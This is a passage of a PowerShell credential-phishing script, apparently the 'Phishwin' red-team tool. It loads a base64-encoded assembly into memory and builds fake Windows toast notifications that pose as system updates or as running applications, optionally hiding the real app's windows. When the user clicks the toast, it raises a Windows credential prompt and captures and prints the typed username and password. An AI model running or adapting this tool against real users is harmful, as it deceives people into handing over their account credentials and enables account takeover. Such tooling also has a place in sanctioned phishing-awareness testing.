AAAAA=='
    [byte[]]$bContent = [System.Convert]::FromBase64String($libB64)
    
    [void][system.reflection.assembly]::Load($bContent)

    # cleanup
    $libB64 = [string]::Empty
    $bContent = $null
    Remove-variable libB64, bContent -ErrorAction silentlycontinue
}

function WrapToastEvent {
    param($target, $eventName);    
    $wrapper = new-object "Phishwin.EventWrapper[Windows.UI.Notifications.ToastNotification,System.Object]";
    $wrapper.Register($target, $eventName);
}

function Get-AppUserModelId ([string]$appName){
    
    $appID = 'Microsoft.Windows.ControlPanel'

    $apps = Get-StartApps

    # Do a full match
    $r = $apps | Where-Object {$_.Name -eq $appName}

    if ($r -ne $null){
        return $r.AppID
    }

    # No result. Do a partial match
    $r = $apps | Where-Object {$_.Name -like "*$appName*"}

    if ($r -ne $null){
        return $r.AppID
    }

    return $appID
}

function Get-UpdateToastTemplate ([string]$title, [string]$message) {

    #$imgLocation = Export-Icon -file 'C:\Program Files\Windows Defender\EppManifest.dll' -index 7
    $imgLocation = Export-Icon -file 'C:\Windows\system32\shell32.dll' -index 316
    $t = "<image placement=`"appLogoOverride`" src=`"$imgLocation`"/>"

    [xml]$ToastTemplate = @"
    <toast duration="50">
        <visual>
            <binding template="ToastGeneric">
                <text>$title</text>
                <text />
                <text>$message</text>      
                $t             
            </binding>
        </visual>
        <actions>
            <input id="snoozeTime" type="selection" defaultInput="3">
                <selection id="1" content="5 Minutes" />
                <selection id="2" content="10 Minutes" />
                <selection id="3" content="15 Minutes" />
                <selection id="4" content="30 Minutes" />
                <selection id="5" content="60 Minutes" />
            </input>
            <action content="Postpone" arguments="postpone"/>
            <action content="Restart" arguments="restart"/>
        </actions>
    </toast>
"@

    return $ToastTemplate

}

function Get-ApplicationToastTemplate ([string]$title, [string[]]$message, [string]$imgLocation) {

    $t = [string]::Empty

    # insert application icon. If no icon is found, use the information icon
    if ([string]::IsNullOrEmpty($imgLocation)) {
        $imgLocation = Export-Icon -file 'C:\Windows\system32\shell32.dll' -index 277
    } 

    $t = "<image placement=`"appLogoOverride`" src=`"$imgLocation`"/>"

    $sBuilder = New-Object system.Text.StringBuilder
    foreach ($m in $message){
        [void]$sBuilder.AppendLine("<text>$m</text>")
    }

    [xml]$ToastTemplate = @"
        <toast launch="app-defined-string">
          <visual>
            <binding template="ToastGeneric">
              <text>$title</text>
              $($sBuilder.ToString())
              $t
            </binding>
          </visual>
        </toast>
"@

    return $ToastTemplate

}

function Get-UserInfo ([string]$caption, $userPrincipal){

    # this function dynamically retrieves userinfo based on a userprincipalobject
    # The $caption variable may contain properties of the userprincipal object
    # like {samaccountname|mail}.
    # 
    # Everything between the accolades is evaluated, however, the first property to return a value is returned by the function
    # This function is great for dynamically retrieving user information to use in this phiswin project.

    $r = '.+\{(?<variable>.+)\}(.+)?'

    # check if we need to evaluate the properties on the userprincipal object
    if ($caption -match $r){

        # Extract the supplied attributes with regex
        $m    = Select-string -InputObject $caption -Pattern $r
        $attr = $m.Matches.Groups | Where-Object {$_.Name -eq 'Variable'} | ForEach-Object {$_.Value}

        # A pipe means multiple attributes. 
        if ($attr.Contains('|')){
            $attrs = $attr.Split('|')

            foreach ($a in $attrs){
                $tmp = $userPrincipal.$a
                if (-not [string]::IsNullOrEmpty($tmp)){
                    $v = $tmp
                    break
                }
            }
        } else {
            # Only one attribute supplied. 
            $v = $userPrincipal.$attr
        }                

        # Return value of the property if a value was found. Otherwise, return supplied data.
        if ($v -ne $null){            
            return $caption.Replace("{$attr}", $v)
        } else {
            return $caption
        }
        
    }else {
        # Caption is not a property. Return the value.
        return $caption
    }
}


function Invoke-CredentialPhisher ([string]$ToastTitle, [string]$ToastMessage, [string]$Application, [string]$credBoxTitle, [string]$credBoxMessage, [string]$ToastType, [switch]$HideProcesses) {

	# Load Depedencies
	Import-PhishWinLib
	[void][Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime]
	[void][Windows.Data.Xml.Dom.XmlDocument, Windows.Data.Xml.Dom, ContentType = WindowsRuntime]
	Add-Type -AssemblyName System.Windows.Forms, PresentationFramework, System.Drawing, WindowsFormsIntegration, System.DirectoryServices.AccountManagement

	# global variable to determine whether a user has clicked on the balloon or not
	$global:clicked = $false

	# Generate message and captions
	$principal = [System.DirectoryServices.AccountManagement.UserPrincipal]::Current
	$tTile     = Get-UserInfo -userPrincipal $principal -caption $ToastTitle
	$tMessage  = (Get-UserInfo -userPrincipal $principal -caption $ToastMessage) -Split "`r`n"
	$global:cTitle   = Get-UserInfo -userPrincipal $principal -caption $credBoxTitle
	$global:cMessage = Get-UserInfo -userPrincipal $principal -caption $credBoxMessage

	# Get appID for control panel. If no default appID is available, the default of windows control panel will be used
	$app = Get-AppUserModelId -appName $Application

	# If we impersonate an application, check if the application is running
	$processName = $Application.ToLower()

	# Get info about Outlook process
	$processHandles = @()
	$processList = Get-Process | where-object {$_.Name.ToLower() -eq $processName}
	foreach ($p in $processList) {
		$processHandles += $p.MainWindowHandle.ToInt32()
	}

	# Extract icon from process
	$iconPath = [string]::Empty
	if ($processList -ne $null) {
		
		# sometimes the path property is not set. use WMI to query path
		$path = $processList[0].Path
		if ([string]::IsNullOrEmpty($path)){
			$r = & wmic process get ExecutablePath | Where-Object {$_.ToLower().contains("$processName")}
			if (-not [string]::IsNullOrEmpty($r)){
				$path = $r
			} else {
				break
			}
		}    
		$iconPath = Get-Icon -processPath $path -returnAsPath:$true
	} else {
		# Check if application is set to a path. That way we can extract the icon as well
		if (Test-Path $Application){
			$iconPath = Get-Icon -processPath $Application -returnAsPath
		}
	}

	# Build the toast
	$xToast = $null
	if ($ToastType -eq 'Application'){
		$xToast = Get-ApplicationToastTemplate -title $tTitle -message $tMessage -imgLocation $iconPath
	} else {
		$xToast = Get-UpdateToastTemplate -title $tTile -message $tMessage
	}

	$ToastXml = New-Object -TypeName Windows.Data.Xml.Dom.XmlDocument
	$ToastXml.LoadXml($xToast.OuterXml)
	$toast = New-Object Windows.UI.Notifications.ToastNotification -ArgumentList $ToastXml
	$toast.ExpirationTime = [datetime]::Now.AddMinutes(1)
	$notify = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($app)  

	$global:credential = New-Object System.Net.NetworkCredential
	$global:credential.UserName = "none"
	$global:credential.Password = "none"
	$global:credential.Domain   = "none"
$global:domain   = "none"
	# Handle all logic when user clicks on toast
	[void](Register-ObjectEvent -InputObject (WrapToastEvent $toast "Activated") -EventName FireEvent -Action { 
		
		$global:clicked = $true
				
		[bool]$save     = $false
		[int]$errorCode = 0
		[System.UInt32]$authPackage   = 0
		[System.UInt32]$dialogReturn  = 0  
		[System.UInt32]$outCredSize   = 0
		[System.IntPtr]$outCredBuffer = 0      

		$credUi = New-Object Phishwin.CredentialDialog+CREDUI_INFO
		$credUi.cbSize = [System.Runtime.InteropServices.Marshal]::SizeOf($credUi)
		$credUi.pszCaptionText = $global:cTitle 
		$credUi.pszMessageText = $global:cMessage  

		$dialogReturn = [Phishwin.CredentialDialog]::CredUIPromptForWindowsCredentials([ref]$credUi, 
					$errorCode, 
					[ref]$authPackage, 
					0,0, 
					[ref]$outCredBuffer, 
					[ref]$outCredSize, 
					[ref]$save, 
					1)


		$maxBuffer = 300
		$usernameBuffer = New-Object System.Text.StringBuilder($maxBuffer)
		$passwordBuffer = New-Object System.Text.StringBuilder($maxBuffer)
		$domainBuffer   = New-Object System.Text.StringBuilder($maxBuffer)

		if ($dialogReturn -eq 0) {
			if ([Phishwin.CredentialDialog]::CredUnPackAuthenticationBuffer(0, $outCredBuffer, $outCredSize, $usernameBuffer, [ref]$maxBuffer, $domainBuffer, [ref]$maxBuffer, $passwordBuffer, [ref]$maxBuffer)) {
				
				# clear the memory allocated by CredUIPromptForWindowsCredentials 
				[Phishwin.CredentialDialog]::CoTaskMemFree($outCredBuffer)
				$global:credential.UserName = $usernameBuffer.ToString()
				$global:credential.Password = $passwordBuffer.ToString()
				$global:credential.Domain   = $domainBuffer.ToString()
				
				Write-Host "[+] Username: $($global:credential.Username) [+]"
				Write-Host "[+] Password: $($global:credential.Password) [+]"            								
			}
		}      
	})
	
	# Do we need to hide the process?
	if ($HideProcesses) {
		Set-WindowVisibility -hWnds $processHandles -windowState SW_HIDE
	}

	# Display toast
	$notify.Show($toast)

	# Wait a few seconds until user clicks on the toast
	$balloonTimer = 10
	$timeElapsed = 0
	while (-not $global:clicked) {
		Start-Sleep (1)
		$timeElapsed++

		if ((-not $global:clicked) -and $timeElapsed -gt $balloonTimer){
			Write-Output "[-] User did not click on the balloon"
			break
		}
	}
	
	Write-Output "[+] Username: $($global:credential.Username) [+]"
	Write-Output "[+] Password: $($global:credential.Password) [+]"
	
	# Restore window visibility
	if ($HideProcesses) {
		Set-WindowVisibility -hWnds $processHandles -windowState SW_RESTORE
	}
}